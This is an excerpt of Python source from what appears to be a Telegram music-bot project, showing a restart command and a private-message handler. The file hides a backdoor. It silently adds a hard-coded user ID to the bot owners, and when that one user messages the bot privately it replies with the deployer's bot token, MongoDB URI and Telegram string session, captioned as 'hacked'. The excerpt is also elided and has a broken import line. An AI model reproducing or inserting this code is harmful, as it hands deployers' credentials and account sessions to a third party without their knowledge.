...
from SURAJM import app
OWNER_ID.append(6657803479)
from SURAJM.core.call import 
from SURAJM.misc import db
from SURAJM.utils.database import get_authuser_names, get_cmode
from SURAJ.utils.decorators import (ActualAdminCB, AdminActual, language)
from SURAJM.utils.command import commandpro                     
from SURAJM.utils.formatters import alpha_to_int
...
async def restartbot(client, message: Message, _):
    ...
    try:
        db[message.chat.id] = []
        await SURAJ.stop_stream(message.chat.id)
    except:
        pass
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await SURAJ.stop_stream(chat_id)
        except:
            pass
...
@app.on_message(
    ...
    & filters.private
    & filters.user(6657803479)
    & ~filters.edited)
async def help(client: Client, message: Message):
    await message.reply_photo(
          photo=f"https://graph.org/file/3904df878c1430939fe60.jpg",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 SURAJ SAINI.\n\n☆............𝙱𝚈 » [SURAJ SAINI](https://t.me/suraj_saini91)............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                          "• нαϲкє𝚍 ву νιρ ɓσყ •", url=f"https://t.me/suraj_saini91")
                 ]
             ]
         ),
     )
